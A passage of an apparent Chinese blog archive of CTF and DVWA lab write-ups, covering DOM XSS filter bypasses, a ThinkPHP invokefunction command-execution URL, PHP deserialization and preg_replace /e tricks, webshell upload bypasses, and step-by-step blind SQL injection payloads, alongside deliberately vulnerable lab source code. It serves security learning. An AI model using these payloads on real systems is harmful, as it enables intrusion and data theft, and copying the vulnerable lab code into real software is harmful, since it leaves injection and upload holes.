3）提前闭合option标签：&gt;&lt;/option&gt;&lt;img src=1 oneeror=alert(1)&gt; 弹窗还是没有跳出来，那么我们也提前闭合select标签 4）提前闭合select标签：&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 oneeror=alert(1)&gt; 弹窗又成功弹出 High：查看源码： 1234567891011121314151617181920&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; # White list the allowable languages switch ($_GET[&#x27;default&#x27;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; &#125;&#125;?&gt; 我们可以看到服务器设立了白名单。这里我们就可以利用DOM型xss的数据不经过服务器的特点来绕过了。 构造payload：English#&lt;script&gt;alert(1)&lt;/script&gt; 由于服务器以get方式获取default的值，而浏览器不会把URL中#后的内容提交到服务器，因此我们可以完美绕过。","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"攻防世界web进阶","date":"2021-03-12T09:23:20.000Z","path":"2021/03/12/攻防世界web进阶1/","text":"baby_web我们点击题目场景，发现跳转到1.php 查阅资料发现一般网站的初始页面都是index.php，于是在url中输入index.php，但是又自动跳转到1.php。 F12进入开发者模式，查看网络模块： 我们可以看到flag就在其中，同时发现网页跳转的原因就是location指向文件1.php。 sp：location——用于重定向一个新的位置，包含一个新的url。表示用户应当到指定地址提取文件。 Training-WWW-Robots本题主要考察对robots.txt的了解和作用。 robots.txt文件是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它 。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。Robots.txt协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。 当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。 打开题目地址，看到这是一个对robots.txt的简介 访问一下这个网站的robots.txt 网站不让我们访问这个fl0g.php，那我们就偏访问 ​ 发现flag，收工 php_rce没搞懂 http://111.200.241.244:42333/?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag php2进入题目页面 查看网页源码、回显都没有什么线索，查阅资料得知我们可以通过phps查看php源码。 phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。 查看该页面源码： 代码审计可知，当id=admin时不会爆flag，但是当admin经过编码后可得flag 由于本关url解码了两次（浏览器上传服务器一次，urldecode函数一次），因此我们可以构造?id=%2561dmin ics-06: 我们根据题目提示打开报表中心 我们可以看到id=1，那会不会是参数有问题呢 用burp抓包，对id进行爆破，发现当id=2333时爆出flag 但是这题有一点不明白，就是为什么题目说：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。为什么痕迹是id的值？ Web_php_include参考https://blog.csdn.net/weixin_45844670/article/details/108180309 warmup参考https://blog.csdn.net/yybzzz/article/details/104971608 unserialize3恶补了一下反序列化操作与序列序列化操作。参考资料：https://www.freebuf.com/articles/web/167721.html https://blog.csdn.net/weixin_44677409/article/details/93884388 我这边就简单的概括一下： 序列化——将变量或对象转换成字符串的过程。 反序列化——将字符串转换成变量或对象的过程。 如图序列化后! 魔术方法（）： _construct()：创建对象时初始化_destruction()：结束时销毁对象_toString()：对象被当作字符串时使用_sleep()：序列化对象之前调用_wakeup()：反序列化对象之前调用_call()：调用对象不存在时使用_get()：调用私有属性时使用 注： 1.的魔术方法必须声明为 public 2.public属性序列化后格式为：数据类型:属性名长度:”属性名”。 了解了上述这些我们就可以开始答题啦 我们看到wakeup()函数，再结合题目unseriasize3可以得知这是一道反序列化操作的题， 根据前两行代码可知存在一个数组名xctf，键数1，键名flag，键值111的数组， 在__wakeup()魔术方法中，在反序列化前会自动调用 _wakeup方法，强制输出bad requests，因此我们要绕过之 解题关键：当序列化字符串中表示对象属性个数（键数）的值大于实际的属性个数（键数）时会跳过__wakeup的执行 构造字符串?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;绕过__wakeup方法 supersqli打开题目地址发现是SQL注入的题，先拿sqlmap跑了一下，发现只能跑出数据库名，再下去就跑不动了，于是只能回来乖乖手工注入。 输入1&#39;报错 输入1&#39; and &#39;1&#39;=&#39;1，正常； 输入1&#39; and &#39;1&#39;=&#39;2，异常； 因此注入类型为&#39;。 尝试union联合注入，发现过滤了许多单词 因此避免使用含select语句的方式好像也只有堆叠注入了 参考博客：https://blog.csdn.net/rfrder/article/details/108583338","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"攻防世界web进阶","date":"2021-03-12T09:23:20.000Z","path":"2021/03/12/攻防世界web进阶2/","text":"NewsCenterWeb_php_unserialize：（反序列化）打开题目地址，就看到了源码 123456789101112131415161718192021222324252627&lt;?php class Demo &#123; private $file = &#x27;index.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;index.php&#x27;) &#123; //the secret is in the fl4g.php $this-&gt;file = &#x27;index.php&#x27;; &#125; &#125; &#125;if (isset($_GET[&#x27;var&#x27;])) &#123; $var = base64_decode($_GET[&#x27;var&#x27;]); if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; die(&#x27;stop hacking!&#x27;); &#125; else &#123; @unserialize($var); &#125; &#125; else &#123; highlight_file(&quot;index.php&quot;); &#125; ?&gt; 正则表达式：&#39;/[oc]:\\d+:/i&#39; /XXXX/ —— php的正则表达式需要放在// 之间 i ——修饰符，表示忽略大小写 [oc] ——匹配o和c: \\d ——匹配一个数字 \\d+ ——匹配多个数字 代码审计：服务器get获得var的值，先对var的值base64解码，然后正则匹配判断是否存在O：数字或C：数字，若不存在则在反序列之前执行__wakeup()魔术方法。 那么我们需要绕过正则匹配和__wakeup() O:+4:——绕过正则匹配 O:+4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}——把1换成2绕过__wakeup() 最后对payload进行base64encode，得：TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 最后有一个问题没搞懂：“Demofile”只有8位，而前面字段却写了10，这是因为private型变量序列化之后会变成“\\x00 + 类名 + \\x00 + 变量名”形式。？？？？？？？？？？？？？？？？？？？ TzorNDoiRGVtbyI6Mjp7czoxMDoiIERlbW8gZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 错 TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 对 NaNNaNNaNNaN-Batman：（alert函数+代码审计）下载附件1web100.txt，打开发现是乱码 用浏览器打开，发现一个输入框 但是输入什么都没反应，查阅资料： eval函数，这是执行函数；这里执行了_变量中的内容(_等于$函数的内容,也就是单引号之间内容)，但是，要注意的是，它并没有执行$()函数，仅仅执行了字符串而已（从而导致乱码），因而页面html页面没有任何显示，只显示了input标签的内容，但是我们想让源代码正常显示出来，不进行执行，那么，我们就用到了alert弹窗（将eval函数改为alert），将乱码的$()函数源码完整显示出来 整理得： 1234567891011121314151617181920function $()&#123;var e=document.getElementById(&quot;c&quot;).value;if(e.length==16)if(e.match(/^be0f23/)!=null)if(e.match(/233ac/)!=null)if(e.match(/e98aa$/)!=null)if(e.match(/c7be9/)!=null)&#123;var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];var s=[t,n,r,i];for(var o=0;o&lt;13;++o)&#123; document.write(s[o%4][0]);s[o%4].splice(0,1)&#125; &#125; &#125; document.write(&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;);delete _ 新函数： splice() 功能：从数组中添加/删除项目，然后返回被删除的项目。 语法：arrayObject.splice(index,howmany,item1,.....,itemX) 参数 描述 index 必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。 howmany 必需。要删除的项目数量。如果设置为 0，则不会删除项目。 item1, …, itemX 可选。向数组添加的新项目。 法1：输入符合条件的e，令其执行后续代码 正则表达式： ^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa，其它的只要匹配到就好，没有位置要求于是我们构造e的值：be0f233ac7be98aa 在输入框内输入e的值： 法2：直接看后半段源码，循环推理也可得e的值。但是我感觉有点麻烦。 web2：（解码）点开题目地址： 发现这是一道解码题，只要解出miwen的值，就得到flag 新函数： strrev()函数： 功能：反转字符串。 语法：strrev(string) 参数 描述 string 必需。规定要反转的字符串。 ord()函数： 功能：以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值。即一个返回一个对应的十进制数。 语法：ord(c) char()函数： 功能：根据指定的 ASCII 值返回字符。（ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。） 语法：chr(ascii) 参数 描述 ascii 必需。ASCII 值。 str_rot13()函数： 功能：对字符串执行 ROT13 编码。ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。 语法：str_rot13(string) 参数 描述 string 必需。规定要编码的字符串。 sp：对字符串解码和编码都是同一个函数 代码审计：先反转字符串，然后对字符串每个字母对应的ascll码值加一，再找到加值对应的ascll码，把每个字符再拼接成一个字符串， 然后对该字符串依次进行base64编码、反转、 ROT13 编码，结果就是输出的miwen的值。 据此我们可以编写一段php代码进行解码： 12345678910111213141516171819&lt;?php$str=&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;$_ = base64_decode(strrev(str_rot13($str)));$_o=null;for($_0=0;$_0&lt;strlen($_);$_0++)&#123; $_c=substr($_,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_o=$_o.$_c; &#125; echo strrev($_o);?&gt; ics-05：（http://filter利用+preg_replace()函数漏洞利用）我们看到题目描述： 点开题目地址，找到设备维护中心 发现是文件包含，尝试用php://filter读取index.php源码：php://filter/read=convert.base64-encode/resource=index.php 对获得的字符串进行base64-decode，得： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144&lt;?phperror_reporting(0);@session_start();posix_setuid(1000);?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta name&#x3D;&quot;renderer&quot; content&#x3D;&quot;webkit&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge,chrome&#x3D;1&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, maximum-scale&#x3D;1&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;layui&#x2F;css&#x2F;layui.css&quot; media&#x3D;&quot;all&quot;&gt; &lt;title&gt;设备维护中心&lt;&#x2F;title&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;ul class&#x3D;&quot;layui-nav&quot;&gt; &lt;li class&#x3D;&quot;layui-nav-item layui-this&quot;&gt;&lt;a href&#x3D;&quot;?page&#x3D;index&quot;&gt;云平台设备维护中心&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;fieldset class&#x3D;&quot;layui-elem-field layui-field-title&quot; style&#x3D;&quot;margin-top: 30px;&quot;&gt; &lt;legend&gt;设备列表&lt;&#x2F;legend&gt; &lt;&#x2F;fieldset&gt; &lt;table class&#x3D;&quot;layui-hide&quot; id&#x3D;&quot;test&quot;&gt;&lt;&#x2F;table&gt; &lt;script type&#x3D;&quot;text&#x2F;html&quot; id&#x3D;&quot;switchTpl&quot;&gt; &lt;!-- 这里的 checked 的状态只是演示 --&gt; &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;sex&quot; value&#x3D;&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin&#x3D;&quot;switch&quot; lay-text&#x3D;&quot;开|关&quot; lay-filter&#x3D;&quot;checkDemo&quot; &#123;&#123; d.id&#x3D;&#x3D;1 0003 ? &#39;checked&#39; : &#39;&#39; &#125;&#125;&gt; &lt;&#x2F;script&gt; &lt;script src&#x3D;&quot;layui&#x2F;layui.js&quot; charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; layui.use(&#39;table&#39;, function() &#123; var table &#x3D; layui.table, form &#x3D; layui.form; table.render(&#123; elem: &#39;#test&#39;, url: &#39;&#x2F;somrthing.json&#39;, cellMinWidth: 80, cols: [ [ &#123; type: &#39;numbers&#39; &#125;, &#123; type: &#39;checkbox&#39; &#125;, &#123; field: &#39;id&#39;, title: &#39;ID&#39;, width: 100, unresize: true, sort: true &#125;, &#123; field: &#39;name&#39;, title: &#39;设备名&#39;, templet: &#39;#nameTpl&#39; &#125;, &#123; field: &#39;area&#39;, title: &#39;区域&#39; &#125;, &#123; field: &#39;status&#39;, title: &#39;维护状态&#39;, minWidth: 120, sort: true &#125;, &#123; field: &#39;check&#39;, title: &#39;设备开关&#39;, width: 85, templet: &#39;#switchTpl&#39;, unresize: true &#125; ] ], page: true &#125;); &#125;); &lt;&#x2F;script&gt; &lt;script&gt; layui.use(&#39;element&#39;, function() &#123; var element &#x3D; layui.element; &#x2F;&#x2F;导航的hover效果、二级菜单等功能，需要依赖element模块 &#x2F;&#x2F;监听导航点击 element.on(&#39;nav(demo)&#39;, function(elem) &#123; &#x2F;&#x2F;console.log(elem) layer.msg(elem.text()); &#125;); &#125;); &lt;&#x2F;script&gt;&lt;?php$page &#x3D; $_GET[page];if (isset($page)) &#123;if (ctype_alnum($page)) &#123;?&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt; &lt;div style&#x3D;&quot;text-align:center&quot;&gt; &lt;p class&#x3D;&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;&#x2F;p&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;?php&#125;else&#123;?&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt; &lt;div style&#x3D;&quot;text-align:center&quot;&gt; &lt;p class&#x3D;&quot;lead&quot;&gt; &lt;?php if (strpos($page, &#39;input&#39;) &gt; 0) &#123; die(); &#125; if (strpos($page, &#39;ta:text&#39;) &gt; 0) &#123; die(); &#125; if (strpos($page, &#39;text&#39;) &gt; 0) &#123; die(); &#125; if ($page &#x3D;&#x3D;&#x3D; &#39;index.php&#39;) &#123; die(&#39;Ok&#39;); &#125; include($page); die(); ?&gt; &lt;&#x2F;p&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;?php&#125;&#125;&#x2F;&#x2F;方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123; echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern &#x3D; $_GET[pat]; $replacement &#x3D; $_GET[rep]; $subject &#x3D; $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 其中最关键的代码内容： 1234567891011121314151617181920212223&lt;?php&#125;&#125;&#x2F;&#x2F;方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123; echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern &#x3D; $_GET[pat]; $replacement &#x3D; $_GET[rep]; $subject &#x3D; $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 代码审计：当服务器收到来自ip=127.0.0.1的访问请求时，会认为其是管理员。此时可以伴随上传三个参数，作为preg_replace()函数的变量。 学习： preg_replace()函数危险的/e修饰符（https://www.jb51.net/article/38714.htm） 说明：/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 preg_replace($pattern, $replacement, $subject)作用：搜索subject中匹配pattern的部分， 以replacement的内容进行替换。$pattern: 要搜索的模式，可以是字符串或一个字符串数组。$replacement: 用于替换的字符串或字符串数组。$subject: 要搜索替换的目标字符串或字符串数组。","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"DVWA—Weak Session IDs","date":"2021-03-12T08:50:01.000Z","path":"2021/03/12/DVWA—Weak Session IDs/","text":"前言：Weak Session IDs：密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个Session，浏览器需要把当前用户持有的SessionID告知服务器。SessionID一旦在生命周期内被窃取，就等同于账户失窃。同时由于SessionID是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登陆过程（比如密码）。————————————————版权声明：摘自为CSDN博主「baynk」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/u014029795/article/details/102795784","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA—File Uplod","date":"2021-03-12T02:37:19.000Z","path":"2021/03/12/DVWA—File Uplod/","text":"前言：之前刷过upload就不多说了 Low：查看源码： 12345678910111213141516171819&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 我们可以看到服务器对上传文件的类型、内容没有做任何检查、过滤，那么我们上传webshell.php，连接蚁剑，即可控制整个服务器。 ![1](DVWA—File Uplod/1.png) Medium：查看源码： 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; 我们可以看到，服务器对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。 法一：搭配文件包含漏洞 我们上传文件名为webshell.png，内容为一句话木马，然后利用文件包含漏洞的特性，借助Medium级别的文件包含漏洞来获取webshell权限。用蚁剑连接：http://localhost:81/vulnerabilities/fi/?page=hthttp://tp://localhost:81/hackable/uploads/webshell.png，但是发现连接失败，返回内容为空。原来，蚁剑在连接时并没有携带cookie，正因为缺少cookie值才无法连接成功。 解决方法就是添加cookie，具体请看：https://blog.csdn.net/qq_39174983/article/details/111983259?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161426249816780261924019%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161426249816780261924019&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111983259.pc_search_result_no_baidu_js&amp;utm_term=DVWA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EHigh 法二：抓包修改 我们先上传webshell.png，内容为一句话木马，然后抓包，修改文件名后缀为php ![2](DVWA—File Uplod/2.png) 蚁剑连接即可 ![1](DVWA—File Uplod/1.png) High：查看源码： 1234567891011121314151617181920212223242526272829303132333435&lt;&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; 我们可以看到服务器这次检查了文件名后缀，设置了白名单，并且getimagesize函数检查了文件头内容。 我们可以利用图片马搭配文件包含漏洞完成绕过。具体步骤和Medium级别的一句话木马上传没有什么差别。","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWA—SQL Injection (Blind)","date":"2021-03-10T08:48:00.000Z","path":"2021/03/10/DVWA—SQL Injection (Blind)/","text":"前言：SQL盲注与一般SQL注入的区别在于一般SQL注入的攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行的结果，甚至连注入语句是否执行都无法得知。 Low：1）判断注入点即其类型 1’ and ‘1’=’1![2](DVWA—SQL Injection (Blind)/2.png) 1’ and ‘1’=’2![1](DVWA—SQL Injection (Blind)/1.png) 可知存在注入点，且注入类型为&#39; 2）猜测SQL查询语句的字段数 1’ order by 2#![2](DVWA—SQL Injection (Blind)/2.png) 1’ order by 3#![1](DVWA—SQL Injection (Blind)/1.png) 3）爆库 1’ and length(database())=1 # ，不存在 1’ and length(database())=2 # ，不存在 1’ and length(database())=3 # ，不存在 1’ and length(database())=4 # ，存在，因此库名长度为四 1’ and left(database(),1)=’d’#，存在，一次库名的首字母为d，剩下的一次类推，得库名为dvwa 4）爆表 先猜表个数 1’ and (select count(table_name) from information_schema.tables where table_schema=database())=2 #，存在，即有两个表 猜表名长度 1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，存在，第一个表名有9个字母 1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 # 存在，第二个表名有5个字母 猜表名组成字符 1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)=’u’ #，存在，说明第二个表的表名首字母为u，以此类推可得第二个表表名为users 5）爆列 爆列和爆表基本相似，仅需稍微修改一点即可，下面就举猜表个数为例，其余自行变通。 1’ and (select count(column_name) from information_schema.columns where table_name=’users’)=14 #，存在，说明有14个列 6）爆值 爆值手动操作量太大了，这里就以爆列：user为例 1’ and substr((select user from users limit 0,1),1,1)=’a’# 查看源码： 12345678910111213141516171819202122232425262728?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_GET[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; Medium：查看源码： 1234567891011121314151617181920212223242526&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; //mysql_close();&#125;?&gt; 还是抓包，然后修改上传数据，大体同SQL Injection （Medium） High：查看源码： 12345678910111213141516171819202122232425262728293031323334 &lt;?phpif( isset( $_COOKIE[ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_COOKIE[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // Might sleep a random amount if( rand( 0, 5 ) == 3 ) &#123; sleep( rand( 2, 4 ) 